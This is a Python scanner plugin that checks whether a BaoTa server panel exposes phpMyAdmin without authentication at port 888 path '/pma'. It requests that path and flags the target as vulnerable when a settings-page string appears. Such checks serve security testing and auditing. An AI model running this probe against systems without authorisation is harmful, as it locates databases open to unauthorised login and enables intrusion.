#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
from urllib.parse import urlparse

def vuln_info():
    info={
        'name': 'phpmyadmin未授权',
        'referer':'https://www.cnblogs.com/liujizhou/p/13550758.html',
        'author':'qianxiao996',
        'description':'''宝塔Linux面板7.4.2版本和Windows面板6.8版本存在phpmyadmin未授权访问漏洞
漏洞未phpmyadmin未鉴权，可通过特定地址直接登录数据库的漏洞。
漏洞URL：http://ip:888/pma      即可直接登录（但要求必须安装了phpmyadmin）'''

    }
    return info
def run(url,timeout):
    # print(url)
    return_list = ['不存在','Payload']
    bug = '/pma'
    url = url + bug
    try:
        r = requests.get(url,timeout=timeout)
        zt = r.status_code
        if zt == 200:
            r_bianma = r.content
            r_doc = str(r_bianma,'utf-8')
            demo = '常规设置'
            good = demo in r_doc
            if good == True:
                return_list[0]= '存在'
                return_list[1]= url
                return return_list
            else:
                return_list[0]= '不存在'
                return return_list
        else:
            return_list[0]= '不存在'
            return return_list
    except Exception as e :
        return_list[0]= '不存在'
        return ['错误',str(e)]
    

